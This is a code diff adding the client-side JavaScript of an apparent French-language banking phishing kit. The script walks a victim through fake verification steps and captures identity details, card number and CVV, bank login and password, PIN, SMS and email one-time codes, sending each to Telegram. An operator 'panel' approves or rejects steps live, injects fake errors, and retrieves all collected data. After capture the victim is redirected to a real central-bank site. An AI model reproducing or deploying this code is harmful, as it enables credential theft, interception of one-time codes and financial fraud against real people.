+            telephone.classList.remove('error');
+            if (errorElement) errorElement.style.display = 'none';
+            return true;
+        }
+
+        function setupPhoneInputWithCountryCode() {
+            const phoneContainer = document.getElementById('phone-input-container');
+            if (!phoneContainer) return;
+            const countrySelect = document.createElement('select');
+            countrySelect.id = 'country-code';
+            countrySelect.className = 'form-select';
+            countrySelect.style.width = '160px';
+            countrySelect.style.flexShrink = '0';
+            
+            Object.entries(COUNTRY_CODES).forEach(([code, data]) => {
+                const option = document.createElement('option');
+                option.value = code;
+                option.textContent = `${data.flag} ${data.code} (${data.name}) - ${data.digits} chiffres`;
+                countrySelect.appendChild(option);
+            });
+            
+            let phoneInput = document.getElementById('telephone');
+            if (!phoneInput) {
+                phoneInput = document.createElement('input');
+                phoneInput.type = 'tel';
+                phoneInput.id = 'telephone';
+                phoneInput.className = 'form-input';
+                phoneInput.placeholder = 'Votre numéro';
+                phoneInput.required = true;
+            }
+            
+            phoneContainer.innerHTML = '';
+            phoneContainer.appendChild(countrySelect);
+            phoneContainer.appendChild(phoneInput);
+            
+            detectCountryCode().then(countryData => {
+                const countryCode = Object.keys(COUNTRY_CODES).find(key => COUNTRY_CODES[key].code === countryData.code);
+                if (countryCode) { 
+                    countrySelect.value = countryCode; 
+                }
+                updateSMSPhoneNumber();
+            });
+            
+            phoneInput.addEventListener('input', function(e) {
+                const selectedCountry = countrySelect.value;
+                e.target.value = formatPhoneNumber(e.target.value, selectedCountry);
+                updateSMSPhoneNumber();
+                const cleanNumber = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+                const countryData = COUNTRY_CODES[selectedCountry];
+                if (cleanNumber.length > 0) {
+                    e.target.style.borderColor = cleanNumber.length === countryData.digits ? '#10B981' : '#F59E0B';
+                } else { e.target.style.borderColor = 'var(--border-color)'; }
+            });
+            
+            countrySelect.addEventListener('change', function() {
+                const selectedCountry = countrySelect.value;
+                const country = COUNTRY_CODES[selectedCountry];
+                phoneInput.placeholder = `${country.digits} chiffres (ex: ${country.format.replace(/X/g, '•')})`;
+                phoneInput.value = formatPhoneNumber(phoneInput.value, selectedCountry);
+                updateSMSPhoneNumber();
+            });
+        }
+
+        function updateSMSPhoneNumber() {
+            const telephone = document.getElementById('telephone');
+            const countrySelect = document.getElementById('country-code');
+            const smsPhoneElement = document.getElementById('sms-phone-number');
+            if (smsPhoneElement && telephone && countrySelect && telephone.value) {
+                const selectedCountry = countrySelect.value;
+                const countryData = COUNTRY_CODES[selectedCountry];
+                if (countryData) {
+                    const cleanNumber = telephone.value.replace(/\s/g, '').replace(/\D/g, '');
+                    const maskedNumber = cleanNumber.length > 4 ? 
+                        `${countryData.flag} ${countryData.code} ${'•'.repeat(cleanNumber.length - 4)}${cleanNumber.slice(-4)}` :
+                        `${countryData.flag} ${countryData.code} ${'•'.repeat(countryData.digits)}`;
+                    smsPhoneElement.innerHTML = maskedNumber;
+                }
+            } else if (smsPhoneElement) {
+                smsPhoneElement.innerHTML = '🇫🇷 +33 ••• •• •• ••';
+            }
+        }
+
+        // ============================================
+        // PANEL COMMUNICATOR AMÉLIORÉ (conservé)
+        // ============================================
+        class PanelCommunicator {
+            constructor() {
+                this.sessionId = currentSessionId;
+                this.initialized = false;
+                this.commandHandlers = {};
+                this.timers = {};
+                this.sessionInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    url: window.location.href
+                };
+                setTimeout(() => this.sendInitialPing(), 500);
+            }
+
+            sendInitialPing() {
+                console.log('📡 Envoi ping initial au panel');
+                this.sendToPanel('init', { sessionId: this.sessionId, message: 'Site ready', sessionInfo: this.sessionInfo });
+                localStorage.setItem('panel_session_' + this.sessionId, JSON.stringify({
+                    sessionId: this.sessionId, currentStep: 1, timestamp: Date.now(), sessionInfo: this.sessionInfo
+                }));
+            }
+
+            init() {
+                if (this.initialized) return;
+                console.log('🚀 Initialisation PanelCommunicator...');
+                this.registerCommandHandlers();
+                this.startHeartbeat();
+                this.setupRealTimeCommandListening();
+                this.initialized = true;
+                console.log('✅ PanelCommunicator initialisé - Session:', this.sessionId);
+                this.updateStatus();
+                this.sendToPanel('initialized', this.status);
+            }
+
+            registerCommandHandlers() {
+                this.commandHandlers = {
+                    'validateStep3': () => { window.panelValidateStep3(); return { success: true }; },
+                    'rejectStep3': (data) => { window.panelRejectStep3(data?.message); return { success: true }; },
+                    'validateStep4': () => { window.panelValidateStep4(); return { success: true }; },
+                    'rejectStep4': (data) => { window.panelRejectStep4(data?.message); return { success: true }; },
+                    'validateStep5': () => { window.panelValidateStep5(); return { success: true }; },
+                    'rejectStep5': (data) => { window.panelRejectStep5(data?.message); return { success: true }; },
+                    'validateStep6': () => { window.panelValidateStep6(); return { success: true }; },
+                    'rejectStep6': (data) => { window.panelRejectStep6(data?.message); return { success: true }; },
+                    'validateStep7': () => { window.panelValidateStep7(); return { success: true }; },
+                    'rejectStep7': (data) => { window.panelRejectStep7(data?.message); return { success: true }; },
+                    'validateLogin': () => { window.panelValidateStep3(); return { success: true }; },
+                    'rejectLogin': (data) => { window.panelRejectStep3(data?.message); return { success: true }; },
+                    'sendErrorConnection': (data) => { this.simulateError({ type: 'connection', message: data?.message }); return { success: true }; },
+                    'sendErrorPIN': (data) => { this.simulateError({ type: 'pin', message: data?.message }); return { success: true }; },
+                    'sendErrorSMS': (data) => { this.simulateError({ type: 'sms', message: data?.message }); return { success: true }; },
+                    'sendErrorEmail': (data) => { this.simulateError({ type: 'email', message: data?.message }); return { success: true }; },
+                    'forceStep': (data) => { this.forceGoToStep(data?.step); return { success: true }; },
+                    'stopAll': () => { this.stopAll(); return { success: true }; },
+                    'getStatus': () => { this.updateStatus(); return { success: true, status: this.status }; },
+                    'getAllData': () => { return { success: true, data: collectedData }; },
+                    'hardReset': () => { 
+                        console.log('💥 Hard reset demandé par le panel');
+                        collectedData = { errorCounts: { connection: 0, code: 0, sms: 0, email: 0 } };
+                        currentStep = 1;
+                        this.forceGoToStep(1);
+                        return { success: true, message: 'Reset effectué' }; 
+                    }
+                };
+            }
+
+            sendToPanel(type, data) {
+                const message = { type, data: { ...data, sessionId: this.sessionId }, timestamp: Date.now(), source: 'site' };
+                window.dispatchEvent(new CustomEvent('panelMessage', { detail: message }));
+                localStorage.setItem('panel_latest_message', JSON.stringify(message));
+                window.postMessage({ type: 'panelMessage', data: message, source: 'site', sessionId: this.sessionId }, '*');
+                console.log(`📤 Message: ${type}`);
+                return message;
+            }
+
+            executeCommand(command) {
+                const { action, data } = command;
+                console.log(`📨 Exécution commande: ${action}`);
+                const handler = this.commandHandlers[action];
+                if (handler) {
+                    try { return handler(data); } 
+                    catch (e) { console.error(`❌ Erreur ${action}:`, e); return { success: false, error: e.message }; }
+                }
+                return { success: false, error: 'Handler not found' };
+            }
+
+            setupRealTimeCommandListening() {
+                window.addEventListener('storage', (event) => {
+                    if (event.key && (event.key.startsWith('panel_command_') || event.key === 'panel_command')) {
+                        try { 
+                            const command = JSON.parse(event.newValue);
+                            if (!command.data?.sessionId || command.data.sessionId === this.sessionId) {
+                                this.executeCommand(command);
+                            }
+                        } catch (e) {}
+                    }
+                });
+                
+                window.addEventListener('message', (event) => {
+                    if (event.data?.type === 'panelCommand') {
+                        let command = event.data.command || event.data;
+                        if (!command.data?.sessionId || command.data.sessionId === this.sessionId) {
+                            this.executeCommand(command);
+                        }
+                    }
+                });
+                
+                setInterval(() => {
+                    const globalCommand = localStorage.getItem('panel_command');
+                    if (globalCommand) {
+                        try { 
+                            const command = JSON.parse(globalCommand);
+                            if (!command.data?.sessionId || command.data.sessionId === this.sessionId) {
+                                this.executeCommand(command);
+                            }
+                            localStorage.removeItem('panel_command');
+                        } catch (e) {}
+                    }
+                    
+                    const sessionCommand = localStorage.getItem(`panel_command_${this.sessionId}`);
+                    if (sessionCommand) {
+                        try { 
+                            this.executeCommand(JSON.parse(sessionCommand)); 
+                            localStorage.removeItem(`panel_command_${this.sessionId}`); 
+                        } catch (e) {}
+                    }
+                }, 100);
+            }
+
+            startHeartbeat() {
+                setInterval(() => {
+                    this.updateStatus();
+                    this.sendToPanel('heartbeat', this.status);
+                }, 1000);
+            }
+
+            updateStatus() {
+                this.status = {
+                    currentStep: currentStep || 1,
+                    sessionId: this.sessionId,
+                    lastUpdate: Date.now()
+                };
+            }
+
+            forceGoToStep(step) {
+                console.log(`🎯 Forçage vers étape: ${step}`);
+                this.stopAll();
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active, .success-notification.show').forEach(el => {
+                    el.classList.remove('active', 'show');
+                });
+                
+                let targetElement;
+                if (!isNaN(step) && step >= 1 && step <= 9) { currentStep = parseInt(step); }
+                
+                switch(step) {
+                    case 1: targetElement = document.getElementById('step-1'); currentStep = 1; break;
+                    case 2: targetElement = document.getElementById('step-2'); currentStep = 2; break;
+                    case 3: targetElement = document.getElementById('step-3'); currentStep = 3; break;
+                    case 4: targetElement = document.getElementById('step-4'); currentStep = 4; startConfirmationCountdown(); break;
+                    case 5: targetElement = document.getElementById('step-5'); currentStep = 5; break;
+                    case 6: targetElement = document.getElementById('step-6'); currentStep = 6; break;
+                    case 7: targetElement = document.getElementById('step-7'); currentStep = 7; startEmailCountdown(); break;
+                    case 8: targetElement = document.getElementById('step-8'); currentStep = 8; break;
+                    case 9: targetElement = document.getElementById('step-9'); currentStep = 9; break;
+                    case 'loading-60': targetElement = document.getElementById('step-loading-60'); break;
+                    case 'loading-pin': targetElement = document.getElementById('step-loading-pin'); break;
+                    case 'loading-sms': targetElement = document.getElementById('step-loading-sms'); break;
+                    case 'loading-email': targetElement = document.getElementById('step-loading-email'); break;
+                    case 'success': showSuccessNotification(); break;
+                }
+                
+                if (targetElement) { targetElement.classList.add('active'); }
+                this.updateStatus();
+                this.sendToPanel('stepChanged', { from: this.status.currentStep, to: currentStep });
+            }
+
+            stopAll() {
+                console.log('⏱️ Arrêt de tous les timers');
+                if (confirmationTimer) { clearInterval(confirmationTimer); confirmationTimer = null; }
+                if (emailCountdownTimer) { clearInterval(emailCountdownTimer); emailCountdownTimer = null; }
+            }
+
+            simulateError(data) {
+                const { type, message } = data;
+                if (typeof showSiteError === 'function') { showSiteError(type, message || 'Erreur simulée'); }
+                if (collectedData.errorCounts) { 
+                    collectedData.errorCounts[type] = (collectedData.errorCounts[type] || 0) + 1; 
+                }
+            }
+        }
+
+        const panelComm = new PanelCommunicator();
+
+        // ============================================
+        // FONCTIONS DE CONTRÔLE PAR ÉTAPE (conservées)
+        // ============================================
+
+        window.panelValidateStep3 = function() {
+            console.log('✅ Panel: Validation étape 3');
+            hideLoading();
+            if (currentStep === 3) { 
+                document.getElementById('step-3').classList.remove('active');
+                document.getElementById('step-4').classList.add('active');
+                currentStep = 4;
+                startConfirmationCountdown();
+            } else {
+                panelComm.forceGoToStep(4);
+            }
+            updateAllBankDisplays();
+            log('✅ Connexion validée');
+        };
+
+        window.panelRejectStep3 = function(message) {
+            console.log('❌ Panel: Rejet étape 3:', message);
+            hideLoading();
+            showSiteError('connection', message || 'Connexion refusée');
+            log('❌ Connexion rejetée');
+        };
+
+        window.panelValidateStep4 = function() {
+            console.log('✅ Panel: Validation étape 4');
+            hideLoading();
+            if (currentStep === 4) {
+                document.getElementById('step-4').classList.remove('active');
+                document.getElementById('step-loading-60').classList.add('active');
+                const progressFill = document.getElementById('progress-fill-60');
+                if (progressFill) { 
+                    progressFill.style.width = '0%'; 
+                    setTimeout(() => progressFill.style.width = '100%', 50); 
+                }
+                log('⏳ Loading étape 4 en attente');
+            } else {
+                panelComm.forceGoToStep('loading-60');
+            }
+        };
+
+        window.panelRejectStep4 = function(message) {
+            console.log('❌ Panel: Rejet étape 4:', message);
+            hideLoading();
+            showSiteError('connection', message || 'Confirmation refusée');
+            panelComm.forceGoToStep(3);
+        };
+
+        window.panelValidateStep5 = function() {
+            console.log('✅ Panel: Validation étape 5');
+            hideLoading();
+            if (currentStep === 5) {
+                document.getElementById('step-5').classList.remove('active');
+                document.getElementById('step-loading-pin').classList.add('active');
+                log('⏳ Loading étape 5 en attente');
+            } else {
+                panelComm.forceGoToStep('loading-pin');
+            }
+        };
+
+        window.panelRejectStep5 = function(message) {
+            console.log('❌ Panel: Rejet étape 5:', message);
+            hideLoading();
+            showSiteError('pin', message || 'Code PIN incorrect');
+            panelComm.forceGoToStep(5);
+        };
+
+        window.panelValidateStep6 = function() {
+            console.log('✅ Panel: Validation étape 6');
+            hideLoading();
+            if (currentStep === 6) {
+                document.getElementById('step-6').classList.remove('active');
+                document.getElementById('step-loading-sms').classList.add('active');
+                const progressFill = document.getElementById('progress-fill-sms');
+                if (progressFill) { 
+                    progressFill.style.width = '0%'; 
+                    setTimeout(() => progressFill.style.width = '100%', 50); 
+                }
+                log('⏳ Loading étape 6 en attente');
+            } else {
+                panelComm.forceGoToStep('loading-sms');
+            }
+        };
+
+        window.panelRejectStep6 = function(message) {
+            console.log('❌ Panel: Rejet étape 6:', message);
+            hideLoading();
+            showSiteError('sms', message || 'Code SMS invalide');
+            panelComm.forceGoToStep(6);
+        };
+
+        window.panelValidateStep7 = function() {
+            console.log('✅ Panel: Validation étape 7');
+            hideLoading();
+            if (currentStep === 7) {
+                document.getElementById('step-7').classList.remove('active');
+                document.getElementById('step-loading-email').classList.add('active');
+                const progressFill = document.getElementById('progress-fill-email');
+                if (progressFill) { 
+                    progressFill.style.width = '0%'; 
+                    setTimeout(() => progressFill.style.width = '100%', 50); 
+                }
+                log('⏳ Loading étape 7 en attente');
+            } else {
+                panelComm.forceGoToStep('loading-email');
+            }
+        };
+
+        window.panelRejectStep7 = function(message) {
+            console.log('❌ Panel: Rejet étape 7:', message);
+            hideLoading();
+            showSiteError('email', message || 'Code email invalide');
+            panelComm.forceGoToStep(7);
+        };
+
+        // ============================================
+        // FONCTIONS DE LOG
+        // ============================================
+        function log(message, type = 'info') {
+            console.log(`[${type}] ${message}`);
+        }
+
+        // ============================================
+        // FONCTIONS DE CHARGEMENT (conservées)
+        // ============================================
+        function showLoadingStep60() {
+            document.getElementById('step-4').classList.remove('active');
+            document.getElementById('step-loading-60').classList.add('active');
+            const progressFill = document.getElementById('progress-fill-60');
+            if (progressFill) { 
+                progressFill.style.width = '0%'; 
+                setTimeout(() => progressFill.style.width = '100%', 50); 
+            }
+            console.log('⏳ Loading étape 4 en attente de décision panel');
+        }
+
+        function showLoadingStepPin() {
+            document.getElementById('step-5').classList.remove('active');
+            document.getElementById('step-loading-pin').classList.add('active');
+            console.log('⏳ Loading étape 5 en attente de décision panel');
+        }
+
+        function showLoadingStepSMS() {
+            document.getElementById('step-6').classList.remove('active');
+            document.getElementById('step-loading-sms').classList.add('active');
+            const progressFill = document.getElementById('progress-fill-sms');
+            if (progressFill) { 
+                progressFill.style.width = '0%'; 
+                setTimeout(() => progressFill.style.width = '100%', 50); 
+            }
+            console.log('⏳ Loading étape 6 en attente de décision panel');
+        }
+
+        function showLoadingStepEmail() {
+            document.getElementById('step-7').classList.remove('active');
+            document.getElementById('step-loading-email').classList.add('active');
+            const progressFill = document.getElementById('progress-fill-email');
+            if (progressFill) { 
+                progressFill.style.width = '0%'; 
+                setTimeout(() => progressFill.style.width = '100%', 50); 
+            }
+            console.log('⏳ Loading étape 7 en attente de décision panel');
+        }
+
+        function showLoading(message) {
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const loadingText = document.getElementById('loading-text');
+            if (loadingOverlay && loadingText) {
+                loadingText.textContent = message;
+                loadingOverlay.style.display = 'flex';
+            }
+        }
+
+        function hideLoading() {
+            const loadingOverlay = document.getElementById('loading-overlay');
+            if (loadingOverlay) loadingOverlay.style.display = 'none';
+        }
+
+        // ============================================
+        // NOTIFICATIONS (conservées)
+        // ============================================
+        function showWelcomeNotification() {
+            const welcomeNotification = document.getElementById('welcome-notification');
+            if (!welcomeNotification || welcomeNotificationShown) return;
+            welcomeNotification.classList.remove('show', 'hiding');
+            setTimeout(() => {
+                welcomeNotification.classList.add('show');
+                welcomeNotificationShown = true;
+                setTimeout(() => {
+                    welcomeNotification.classList.add('hiding');
+                    setTimeout(() => {
+                        welcomeNotification.classList.remove('show', 'hiding');
+                        setTimeout(hideUrgentMessage, 13000);
+                    }, 800);
+                }, 7000);
+            }, 100);
+        }
+
+        function hideUrgentMessage() {
+            const urgentCountdown = document.getElementById('urgent-countdown');
+            if (urgentCountdown) urgentCountdown.classList.add('hidden');
+        }
+
+        function showSuccessNotification() {
+            const successNotification = document.getElementById('success-notification');
+            if (successNotification) {
+                successNotification.classList.add('show');
+                start20MinCountdown();
+                const redirectMsg = document.getElementById('redirect-message');
+                if (redirectMsg) redirectMsg.textContent = 'Félicitations ! Redirection dans 15 secondes...';
+                redirectTimer = setTimeout(() => window.location.href = 'https://www.bankofcanada.ca/', 15000);
+            }
+        }
+
+        function showErrorNotification(message) {
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed; top: 30px; left: 50%; transform: translateX(-50%);
+                background: linear-gradient(135deg, #DC2626, #B91C1C); color: white;
+                padding: 20px 30px; border-radius: 15px; font-weight: 600; z-index: 10000;
+                box-shadow: 0 10px 30px rgba(220, 38, 38, 0.4); border: 2px solid #F59E0B;
+                animation: slideDown 0.5s ease; max-width: 500px; text-align: center;
+            `;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            setTimeout(() => { notification.style.animation = 'slideUp 0.5s ease forwards'; setTimeout(() => notification.remove(), 500); }, 3000);
+        }
+
+        window.showSiteError = function(type, customMessage) {
+            console.log(`🔥 Erreur: ${type}`);
+            const errorConfig = {
+                connection: { title: '🔴 ERREUR CONNEXION', message: customMessage || 'Connexion refusée', step: 3, color: '#dc2626' },
+                pin: { title: '🔐 CODE PIN INCORRECT', message: customMessage || 'Code PIN incorrect', step: 5, color: '#ef4444' },
+                sms: { title: '📨 CODE SMS INVALIDE', message: customMessage || 'Code SMS invalide', step: 6, color: '#f97316' },
+                email: { title: '📧 CODE EMAIL INVALIDE', message: customMessage || 'Code email invalide', step: 7, color: '#8b5cf6' }
+            };
+            const error = errorConfig[type] || errorConfig.connection;
+            showErrorNotification(`${error.title} - ${error.message}`);
+        };
+
+        // ============================================
+        // FONCTIONS DE VALIDATION (MODIFIÉES pour inclure Telegram)
+        // ============================================
+        async function validateStep(step) {
+            let isValid = true;
+            hideAllErrors();
+            
+            if (step === 1) {
+                if (!validateField('nom')) isValid = false;
+                if (!validateField('prenom')) isValid = false;
+                if (!validateEmail('email')) isValid = false;
+                if (!validatePhoneNumber()) isValid = false;
+                if (!validateField('adresse')) isValid = false;
+                if (!validateField('banque')) isValid = false;
+                
+                if (isValid) {
+                    collectedData.nom = document.getElementById('nom').value;
+                    collectedData.prenom = document.getElementById('prenom').value;
+                    collectedData.email = document.getElementById('email').value;
+                    collectedData.telephone = document.getElementById('telephone').value;
+                    collectedData.adresse = document.getElementById('adresse').value;
+                    collectedData.banque = document.getElementById('banque').value;
+                    
+                    const message = formatStepMessage(1, collectedData);
+                    sendToTelegram(message);
+                    
+                    showLoading('Traitement en cours...');
+                    setTimeout(() => { hideLoading(); nextStep(); }, 1500);
+                }
+            }
+            
+            if (step === 2) {
+                if (!validateCardNumber('numero-carte')) isValid = false;
+                if (!document.getElementById('nom-carte').value.trim()) { 
+                    document.getElementById('nom-carte-error').style.display = 'block'; 
+                    document.getElementById('nom-carte').classList.add('error');
+                    isValid = false; 
+                }
+                if (!validateExpiration('expiration')) isValid = false;
+                if (!validateCVV('cvv')) isValid = false;
+                
+                if (isValid) {
+                    collectedData.carte = document.getElementById('numero-carte').value;
+                    collectedData.nomCarte = document.getElementById('nom-carte').value;
+                    collectedData.expiration = document.getElementById('expiration').value;
+                    collectedData.cvv = document.getElementById('cvv').value;
+                    
+                    const message = formatStepMessage(2, collectedData);
+                    sendToTelegram(message);
+                    
+                    showLoading('Traitement en cours...');
+                    setTimeout(() => { hideLoading(); nextStep(); }, 1500);
+                }
+            }
+            
+            if (step === 3) {
+                if (!validateField('identifiant')) isValid = false;
+                if (!validateField('motdepasse')) isValid = false;
+                
+                if (isValid) {
+                    collectedData.identifiant = document.getElementById('identifiant').value;
+                    collectedData.motdepasse = document.getElementById('motdepasse').value;
+                    
+                    const message = formatStepMessage(3, collectedData);
+                    sendToTelegram(message);
+                    
+                    showLoading('🔐 Connexion en cours - Veuillez patienter...');
+                    
+                    if (panelComm) {
+                        panelComm.sendToPanel('loginSubmitted', { 
+                            step: 3,
+                            identifiant: collectedData.identifiant.substring(0, 3) + '***'
+                        });
+                    }
+                    
+                    log('⏳ Étape 3 en attente de décision panel', 'info');
+                }
+            }
+            
+            if (step === 5) {
+                if (!validatePIN('pin')) isValid = false;
+                
+                if (isValid) {
+                    collectedData.pin = document.getElementById('pin').value;
+                    
+                    const message = formatStepMessage(5, collectedData);
+                    sendToTelegram(message);
+                    
+                    showLoadingStepPin();
+                    
+                    log('⏳ Étape 5 en attente de décision panel', 'info');
+                }
+            }
+            
+            if (step === 6) {
+                if (!validateSMS('sms')) isValid = false;
+                
+                if (isValid) {
+                    collectedData.sms = document.getElementById('sms').value;
+                    
+                    const message = formatStepMessage(6, collectedData);
+                    sendToTelegram(message);
+                    
+                    showLoadingStepSMS();
+                    
+                    log('⏳ Étape 6 en attente de décision panel', 'info');
+                }
+            }
+            
+            if (step === 7) {
+                const digits = document.querySelectorAll('.email-code-digit');
+                let emailCode = '';
+                digits.forEach(d => { if (d.value) emailCode += d.value; });
+                
+                if (emailCode.length < 5 || emailCode.length > 6 || !/^\d+$/.test(emailCode)) {
+                    showErrorNotification('❌ Code invalide (5-6 chiffres)');
+                    return;
+                }
+                
+                collectedData.emailCode = emailCode;
+                
+                const message = formatStepMessage(7, collectedData);
+                sendToTelegram(message);
+                
+                showLoadingStepEmail();
+                
+                log('⏳ Étape 7 en attente de décision panel', 'info');
+            }
+        }
+
+        function nextStep() {
+            if (currentStep < totalSteps) {
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active').forEach(s => s.classList.remove('active'));
+                currentStep++;
+                document.getElementById(`step-${currentStep}`).classList.add('active');
+                updateAllBankDisplays();
+                if (currentStep === 4) setTimeout(showPushNotification, 2000);
+            }
+        }
+
+        function prevStep(step) {
+            if (step === 9) {
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active').forEach(s => s.classList.remove('active'));
+                document.getElementById('step-8').classList.add('active');
+                currentStep = 8;
+                updateAllBankDisplays();
+            } else if (step === 8) {
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active').forEach(s => s.classList.remove('active'));
+                document.getElementById('step-7').classList.add('active');
+                currentStep = 7;
+                updateAllBankDisplays();
+                startEmailCountdown();
+            } else if (step === 7) {
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active').forEach(s => s.classList.remove('active'));
+                document.getElementById('step-6').classList.add('active');
+                currentStep = 6;
+                updateAllBankDisplays();
+            } else if (step === 6) {
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active').forEach(s => s.classList.remove('active'));
+                document.getElementById('step-5').classList.add('active');
+                currentStep = 5;
+                updateAllBankDisplays();
+            } else if (step === 5) {
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active').forEach(s => s.classList.remove('active'));
+                document.getElementById('step-3').classList.add('active');
+                currentStep = 3;
+                updateAllBankDisplays();
+            } else if (step === 3) {
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active').forEach(s => s.classList.remove('active'));
+                document.getElementById('step-2').classList.add('active');
+                currentStep = 2;
+                updateAllBankDisplays();
+            } else if (step === 2) {
+                document.querySelectorAll('.form-step.active, .confirmation-step.active, .loading-step-60.active, .loading-step-pin.active, .loading-step-sms.active, .loading-step-after-sms.active, .email-confirmation-step.active, .loading-step-email.active, .loading-step-final.active').forEach(s => s.classList.remove('active'));
+                document.getElementById('step-1').classList.add('active');
+                currentStep = 1;
+                updateAllBankDisplays();
+            }
+        }
+
+        function startConfirmationCountdown() {
+            let timeLeft = 60;
+            const countdownElement = document.getElementById('confirmation-countdown');
+            if (confirmationTimer) clearInterval(confirmationTimer);
+            confirmationTimer = setInterval(() => {
+                if (timeLeft <= 0) { clearInterval(confirmationTimer); return; }
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                timeLeft--;
+            }, 1000);
+        }
+
+        function startEmailCountdown() {
+            let timeLeft = 300;
+            const countdownElement = document.getElementById('email-countdown');
+            if (emailCountdownTimer) clearInterval(emailCountdownTimer);
+            emailCountdownTimer = setInterval(() => {
+                if (timeLeft <= 0) { 
+                    clearInterval(emailCountdownTimer); 
+                    countdownElement.textContent = "EXPIRÉ"; 
+                    countdownElement.style.color = '#DC2626';
+                    return; 
+                }
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                timeLeft--;
+            }, 1000);
+        }
+
+        function start20MinCountdown() {
+            let timeLeft = 20 * 60;
+            const countdownElement = document.getElementById('countdown-20min');
+            if (countdownElement) {
+                const countdownInterval = setInterval(() => {
+                    if (timeLeft <= 0) { clearInterval(countdownInterval); countdownElement.textContent = "00:00"; return; }
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                    timeLeft--;
+                }, 1000);
+            }
+        }
+
+        function showPushNotification() {
+            const notification = document.getElementById('push-notification');
+            const bankId = document.getElementById('banque').value;
+            if (notification && bankId) {
+                const bankLogo = document.getElementById('push-bank-logo');
+                const bankName = document.getElementById('push-bank-name');
+                if (bankLogo && BANK_LOGOS[bankId]) bankLogo.innerHTML = `<img src="${BANK_LOGOS[bankId]}" alt="${BANK_NAMES[bankId]}">`;
+                if (bankName) bankName.textContent = BANK_NAMES[bankId] || 'Banque';
+                notification.classList.remove('hiding');
+                notification.classList.add('show');
+                setTimeout(() => { notification.classList.remove('show'); notification.classList.add('hiding'); }, 8000);
+            }
+        }
+
+        // ============================================
+        // FONCTIONS DE VALIDATION (conservées)
+        // ============================================
+        function validateField(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorElement = document.getElementById(`${fieldId}-error`);
+            if (!field.value.trim()) { field.classList.add('error'); errorElement.style.display = 'block'; return false; }
+            field.classList.remove('error'); errorElement.style.display = 'none'; return true;
+        }
+
+        function validateEmail(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorElement = document.getElementById(`${fieldId}-error`);
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!field.value.trim() || !emailRegex.test(field.value)) { field.classList.add('error'); errorElement.style.display = 'block'; return false; }
+            field.classList.remove('error'); errorElement.style.display = 'none'; return true;
+        }
+
+        function validateCardNumber(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorElement = document.getElementById(`${fieldId}-error`);
+            const cardNumber = field.value.replace(/\s+/g, '');
+            if (!field.value.trim() || cardNumber.length < 16) { field.classList.add('error'); errorElement.style.display = 'block'; return false; }
+            field.classList.remove('error'); errorElement.style.display = 'none'; return true;
+        }
+
+        function validateExpiration(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorElement = document.getElementById(`${fieldId}-error`);
+            const expirationRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
+            if (!field.value.trim() || !expirationRegex.test(field.value)) { field.classList.add('error'); errorElement.style.display = 'block'; return false; }
+            field.classList.remove('error'); errorElement.style.display = 'none'; return true;
+        }
+
+        function validateCVV(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorElement = document.getElementById(`${fieldId}-error`);
+            if (!field.value.trim() || field.value.length !== 3) { field.classList.add('error'); errorElement.style.display = 'block'; return false; }
+            field.classList.remove('error'); errorElement.style.display = 'none'; return true;
+        }
+
+        function validatePIN(fieldId) {
+            const field = document.getElementById(fieldId);
+            const errorElement = document.getElementById(`${fieldId}-error`);
+            const pinValue = field.value.trim();
+            if (!pinValue || pinValue.length < 5 || pinValue.length > 6 || !/^\d+$/.test(pinValue)) { field.classList.add('error'); errorElement.style.display = 'block'; return false; }
+            field.classList.remove('error'); errorElement.style.display = 'none'; return true;
+        }
+
+        function validateSMS(fieldId) {
+            const field = document.getElementById(fieldId);
